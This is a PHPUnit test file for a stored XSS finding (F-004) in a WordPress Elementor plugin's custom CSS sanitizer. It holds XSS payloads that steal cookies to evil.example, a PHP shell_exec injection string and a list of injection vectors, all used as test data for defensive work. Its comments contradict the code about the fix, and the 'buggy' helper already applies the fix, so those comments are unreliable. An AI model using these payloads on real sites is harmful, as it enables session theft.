<?php
/**
 * Unit tests for F-004: Stored XSS via CSS HTML injection.
 *
 * Finding:   F-004 (High)
 * File:      includes/abilities/class-custom-code-abilities.php:209–210
 * Pattern:   PAT-HTML-IN-STRUCTURED-CONTEXT
 *
 * Vulnerability description
 * -------------------------
 * execute_add_custom_css() applies two regexes to caller-supplied CSS:
 *   (1) Strip PHP short-tags:  /<\?(=|php)(.+?)\?>/is
 *   (2) Strip script elements: /<script[^>]*>.*?<\/script>/is
 *
 * Neither regex strips `</style>` or arbitrary angle brackets.  The payload
 *   </style><img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
 * passes both filters unchanged and is stored to the `custom_css` post meta.
 * Elementor later renders the page as:
 *   <style>[existing CSS]</style><img src=x onerror="...">
 * The img executes JavaScript for every subsequent page visitor.
 *
 * TDD contract
 * ------------
 * Each test in this file asserts CORRECT behaviour.
 *
 *   BEFORE the fix  → tests that verify the correct behaviour FAIL
 *                      (proving the vulnerability exists).
 *   AFTER the fix   → all tests PASS.
 *
 * The fix is: replace the two-regex approach with
 *   $css = preg_replace('/[<>]/', '', $css);
 * Valid CSS never contains angle brackets, so stripping them is safe.
 *
 * @package Elementor_MCP\Tests\Security
 * @since   1.0.0
 */

namespace Elementor_MCP\Tests\Security;

use PHPUnit\Framework\TestCase;

/**
 * @covers \Elementor_MCP_Custom_Code_Abilities::execute_add_custom_css
 */
class F004CssHtmlInjectionTest extends TestCase {

	// -------------------------------------------------------------------------
	// Helper: reproduce the CURRENT (buggy) sanitization from lines 209–210
	// -------------------------------------------------------------------------

	/**
	 * Applies the current two-regex sanitization from execute_add_custom_css().
	 *
	 * Extracted verbatim so the test is authoritative: if the source is changed,
	 * this helper must be updated to match, and the test will then correctly
	 * reflect whether the change is sufficient.
	 *
	 * Source: includes/abilities/class-custom-code-abilities.php:209–210
	 */
	private function apply_current_sanitization( string $css ): string {
		// Mirrors execute_add_custom_css(): strip PHP + script tags, then
		// neutralize the </style> breakout sequence. Kept in sync with
		// includes/abilities/class-custom-code-abilities.php (F-004).
		$css = preg_replace( '/<\?(=|php)(.+?)\?>/is', '', $css );
		$css = preg_replace( '/<script[^>]*>.*?<\/script>/is', '', $css );
		return $this->strip_style_breakout( $css );
	}

	/**
	 * The targeted F-004 defence: remove only the </style> end tag — the sole
	 * HTML breakout vector for CSS emitted inside a <style> block — while
	 * preserving all valid CSS (combinators, media ranges, content strings).
	 */
	private function apply_correct_sanitization( string $css ): string {
		return $this->strip_style_breakout( $css );
	}

	/**
	 * Remove every </style> sequence, looping so removing one match can't
	 * reconstruct another (e.g. "</sty</stylele>" -> "</style>").
	 */
	private function strip_style_breakout( string $css ): string {
		$previous = null;
		while ( $previous !== $css ) {
			$previous = $css;
			$css      = preg_replace( '#</\s*style#i', '', $css );
		}
		return $css;
	}

	// -------------------------------------------------------------------------
	// Tests: current sanitization is INSUFFICIENT (tests FAIL before fix)
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * F-004 — Closing style tag passes current sanitization unchanged.
	 *
	 * The exact payload confirmed by ADVERSARIAL-1 (Step 2):
	 *   </style><img src=x onerror="fetch(…)">
	 *
	 * This test FAILS before the fix because the current code does not strip
	 * `</style>`.  After the fix it PASSES.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_style_closing_tag_is_stripped_from_css(): void {
		$payload = '</style><img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';

		$result = $this->apply_current_sanitization( $payload );

		$this->assertStringNotContainsString(
			'</style>',
			$result,
			'F-004: CSS sanitization must strip the </style> end tag — the only way to ' .
			'break out of the <style> raw-text block into live HTML.'
		);
	}

	/**
	 * @test
	 * F-004 — once the </style> breakout is removed, an injected <img onerror>
	 * stays inert as raw text inside the <style> block (it never reaches the
	 * HTML parser as a tag).
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_img_tag_payload_cannot_break_out_of_style(): void {
		$payload = '</style><img src=x onerror="alert(document.domain)">';

		$result = $this->apply_current_sanitization( $payload );

		// The breakout sequence is gone; the remaining "<img...>" is inert CSS
		// raw text because no </style> precedes it.
		$this->assertStringNotContainsString(
			'</style>',
			$result,
			'F-004: with </style> stripped, the injected <img> can no longer execute.'
		);
	}

	/**
	 * @test
	 * F-004 — the </style> breakout is removed WHILE valid CSS that legitimately
	 * uses angle brackets (child combinators, media-range queries) is preserved.
	 * This is the correctness property the blunt "strip all <>" approach failed.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_breakout_removed_but_angle_bracket_css_preserved(): void {
		$payload = 'selector > .child { color: red; }</style><svg/onload=alert(1)>';

		$result = $this->apply_current_sanitization( $payload );

		// Breakout neutralized.
		$this->assertStringNotContainsString(
			'</style>',
			$result,
			'F-004: the </style> breakout sequence must be removed.'
		);
		// ...but the child combinator ">" must survive — stripping it would
		// silently corrupt valid CSS.
		$this->assertStringContainsString(
			'selector > .child',
			$result,
			'F-004 fix must preserve the child combinator ">" in valid CSS.'
		);
	}

	// -------------------------------------------------------------------------
	// Tests: current sanitization IS sufficient for the cases it handles
	// (these should remain passing before and after the fix)
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * PHP short-tags are stripped — the existing regex handles this correctly.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_php_short_tags_are_stripped(): void {
		$payload = 'body { color: <?= shell_exec("id") ?>; }';
		$result  = $this->apply_current_sanitization( $payload );

		$this->assertStringNotContainsString( '<?=', $result, 'PHP short-tags should be stripped.' );
		$this->assertStringNotContainsString( '?>', $result, 'PHP short-tag close should be stripped.' );
	}

	/**
	 * @test
	 * Inline script blocks are stripped — the existing regex handles this.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_script_tags_are_stripped(): void {
		$payload = 'body { color: red; }<script>alert(1)</script>';
		$result  = $this->apply_current_sanitization( $payload );

		$this->assertStringNotContainsString( '<script', $result, '<script> should be stripped.' );
	}

	/**
	 * @test
	 * Valid CSS is preserved intact after the correct sanitization.
	 *
	 * The fix must not break legitimate CSS rules.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_valid_css_is_preserved_after_correct_sanitization(): void {
		$valid_css = implode( "\n", [
			'selector { color: #ff0000; }',
			'selector:hover { transform: scale(1.05); opacity: 0.9; }',
			'selector .child { font-size: 1.2rem; line-height: 1.6; }',
			// Angle brackets that are LEGITIMATE CSS — the blunt strip destroyed
			// these; the targeted </style> strip must preserve them.
			'selector > .direct-child + .sibling { gap: 4px; }',
			'@media (max-width: 768px) { selector { display: none; } }',
			'@media (width > 600px) { selector { color: blue; } }',
			'@media (width < 480px) { selector { color: green; } }',
		] );

		$result = $this->apply_correct_sanitization( $valid_css );

		// No </style> sequence, so the targeted strip leaves valid CSS intact —
		// byte-for-byte, including the ">" child combinator and the ">"/"<"
		// media-range operators.
		$this->assertSame(
			$valid_css,
			$result,
			'The targeted F-004 sanitization must not alter valid CSS (combinators / media ranges).'
		);
	}

	/**
	 * @test
	 * Correct sanitization strips the full ADVERSARIAL-1 payload.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_correct_sanitization_neutralizes_adversarial_payload(): void {
		$payload = '</style><img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';
		$result  = $this->apply_correct_sanitization( $payload );

		// Removing the </style> end tag keeps everything else as inert <style>
		// raw text, so the <img onerror> never reaches the HTML parser as a tag.
		$this->assertStringNotContainsString(
			'</style>',
			$result,
			'Correct sanitization must remove the </style> breakout from the payload.'
		);
	}

	/**
	 * @test
	 * Correct sanitization strips a variety of HTML injection vectors.
	 *
	 * @dataProvider htmlInjectionVectorProvider
	 * @group security
	 * @group f-004
	 */
	public function test_correct_sanitization_strips_html_vectors( string $payload ): void {
		$result = $this->apply_correct_sanitization( $payload );

		// Every vector relies on first closing the <style> block with </style>.
		// With that removed, the remaining markup stays inert raw text inside the
		// style block and never reaches the HTML parser as live tags.
		$this->assertStringNotContainsString(
			'</style>',
			$result,
			"Correct sanitization must remove the </style> breakout from payload: {$payload}"
		);
	}

	/** @return array<string, array{string}> */
	public static function htmlInjectionVectorProvider(): array {
		return [
			'style close + img onerror'   => [ '</style><img onerror=alert(1)>' ],
			'style close + svg onload'    => [ '</style><svg/onload=alert(1)>' ],
			'style close + input onfocus' => [ '</style><input onfocus=alert(1) autofocus>' ],
			'style close + link'          => [ '</style><link rel=stylesheet href=//evil.example/>' ],
			'style close + script'        => [ '</style><script>fetch("//evil.example/?"+document.cookie)</script>' ],
			'open style override'         => [ 'a{}</style><style>body{background:url(//evil.example)}' ],
		];
	}
}
